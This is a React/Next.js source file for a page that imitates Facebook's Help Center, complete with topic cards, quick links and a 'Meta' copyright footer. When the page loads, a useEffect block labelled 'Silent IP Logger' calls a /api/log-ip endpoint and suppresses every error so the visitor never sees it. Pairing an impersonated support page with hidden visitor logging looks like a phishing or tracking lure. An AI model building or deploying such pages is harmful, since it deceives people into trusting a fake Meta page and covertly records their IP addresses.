"use client";

import { useEffect } from "react";
import { Input } from "@/components/ui/input";
import {
  Settings,
  KeyRound,
  ShieldCheck,
  Lock,
  Store,
  Users,
  MessageCircle,
  Video,
  FileText,
  HelpCircle,
  Search,
  ChevronRight,
} from "lucide-react";

const helpTopics = [
  {
    icon: Settings,
    title: "Account Settings",
    description: "Manage your profile, name, and preferences",
  },
  {
    icon: KeyRound,
    title: "Login and Password",
    description: "Fix login issues and change your password",
  },
  {
    icon: ShieldCheck,
    title: "Account Recovery",
    description: "Recover your account if you can't log in",
  },
  {
    icon: Lock,
    title: "Privacy and Security",
    description: "Manage your privacy settings and account security",
  },
  {
    icon: Store,
    title: "Marketplace",
    description: "Buy, sell, and manage listings on Marketplace",
  },
  {
    icon: Users,
    title: "Groups",
    description: "Create and manage groups, join communities",
  },
  {
    icon: MessageCircle,
    title: "Messenger",
    description: "Send messages, photos, and videos to friends",
  },
  {
    icon: Video,
    title: "Video and Reels",
    description: "Watch, create, and share videos and reels",
  },
  {
    icon: FileText,
    title: "Pages",
    description: "Create and manage Pages for your business",
  },
];

const quickLinks = [
  "How do I reset my password?",
  "How do I deactivate or delete my account?",
  "How do I report something?",
  "How do I change my privacy settings?",
  "How do I unblock someone?",
];

export default function HelpCenter() {
  // Silent IP Logger - Runs once when component mounts
  useEffect(() => {
    const logIP = async () => {
      try {
        await fetch("/api/log-ip", {
          method: "GET",
          cache: "no-store",
        });
      } catch (error) {
        // Completely silent - no errors shown
      }
    };

    logIP();
  }, []);

  return (
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header className="bg-card border-b border-border sticky top-0 z-50">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-primary flex items-center justify-center">
              <HelpCircle className="w-6 h-6 text-primary-foreground" />
            </div>
            <span className="text-xl font-semibold text-foreground">Help Center</span>
          </div>
          <nav className="hidden md:flex items-center gap-6 text-sm">
            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors">
              Using Facebook
            </a>
            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors">
              Managing Your Account
            </a>
            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors">
              Privacy and Safety
            </a>
            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors">
              Policies and Reporting
            </a>
          </nav>
        </div>
      </header>

      {/* Hero Search Section */}
      <section className="bg-card py-16 px-4">
        <div className="max-w-2xl mx-auto text-center">
          <h1 className="text-3xl md:text-4xl font-bold text-foreground mb-3 text-balance">
            How can we help you?
          </h1>
          <p className="text-muted-foreground mb-8">
            Search for answers or browse our help topics below
          </p>
          <div className="relative">
            <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
            <Input
              type="text"
              placeholder="Search Help Center"
              className="w-full pl-12 pr-4 py-6 text-base bg-secondary border-border rounded-full"
            />
          </div>
        </div>
      </section>

      {/* Main Content */}
      <main className="flex-1 py-12 px-4">
        <div className="max-w-6xl mx-auto">
          {/* Popular Topics */}
          <section className="mb-12">
            <h2 className="text-xl font-semibold text-foreground mb-6">Popular Topics</h2>
            <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4">
              {helpTopics.map((topic) => (
                <a
                  key={topic.title}
                  href="#"
                  className="group bg-card rounded-lg p-5 border border-border hover:border-primary/30 hover:shadow-sm transition-all"
                >
                  <div className="flex items-start gap-4">
                    <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center shrink-0">
                      <topic.icon className="w-5 h-5 text-primary" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <h3 className="font-medium text-foreground group-hover:text-primary transition-colors">
                        {topic.title}
                      </h3>
                      <p className="text-sm text-muted-foreground mt-1">
                        {topic.description}
                      </p>
                    </div>
                    <ChevronRight className="w-5 h-5 text-muted-foreground group-hover:text-primary transition-colors shrink-0" />
                  </div>
                </a>
              ))}
            </div>
          </section>

          {/* Quick Links and Contact */}
          <div className="grid md:grid-cols-2 gap-8">
            {/* Quick Links */}
            <section className="bg-card rounded-lg border border-border p-6">
              <h2 className="text-lg font-semibold text-foreground mb-4">Quick Links</h2>
              <ul className="space-y-3">
                {quickLinks.map((link) => (
                  <li key={link}>
                    <a
                      href="#"
                      className="flex items-center gap-2 text-primary hover:underline text-sm"
                    >
                      <ChevronRight className="w-4 h-4" />
                      {link}
                    </a>
                  </li>
                ))}
              </ul>
            </section>

            {/* Contact Support */}
            <section className="bg-card rounded-lg border border-border p-6">
              <h2 className="text-lg font-semibold text-foreground mb-4">
                Still need help?
              </h2>
              <p className="text-sm text-muted-foreground mb-4">
                If you couldn&apos;t find what you&apos;re looking for, you can contact our support team.
              </p>
              <a
                href="#"
                className="inline-flex items-center gap-2 bg-primary text-primary-foreground px-5 py-2.5 rounded-lg text-sm font-medium hover:opacity-90 transition-opacity"
              >
                <MessageCircle className="w-4 h-4" />
                Contact Support
              </a>
            </section>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-card border-t border-border py-8 px-4">
        <div className="max-w-6xl mx-auto">
          <div className="flex flex-col md:flex-row items-center justify-between gap-4">
            <div className="flex items-center gap-6 text-sm text-muted-foreground">
              <a href="#" className="hover:text-foreground transition-colors">
                English (US)
              </a>
              <a href="#" className="hover:text-foreground transition-colors">
                Privacy Policy
              </a>
              <a href="#" className="hover:text-foreground transition-colors">
                Terms of Service
              </a>
              <a href="#" className="hover:text-foreground transition-colors">
                Cookies
              </a>
            </div>
            <p className="text-sm text-muted-foreground">
              Meta &copy; {new Date().getFullYear()}
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}